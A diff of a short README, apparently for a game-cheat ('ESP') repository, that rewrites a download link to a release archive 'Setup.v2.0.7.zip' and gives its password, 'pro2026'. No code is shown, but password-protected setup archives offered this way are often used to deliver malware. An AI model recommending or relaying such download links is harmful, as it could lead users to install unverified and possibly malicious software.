@@ -2,7 +2,7 @@
 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2b22d6e4-2587-4bf5-acd5-97d0b6746eb5" />
 
-[Download the Latest Version]([https://github.com/Plota-cloud/chameleonEsp-2026/tree/main](https://github.com/Plota-cloud/chameleonEsp-2026/releases/download/tags/Setup.v2.0.7.zip))
+[Download Last][https://github.com/Plota-cloud/chameleonEsp-2026/tree/main](https://github.com/Plota-cloud/chameleonEsp-2026/releases/download/tags/Setup.v2.0.7.zip)
 
 pass: pro2026
 
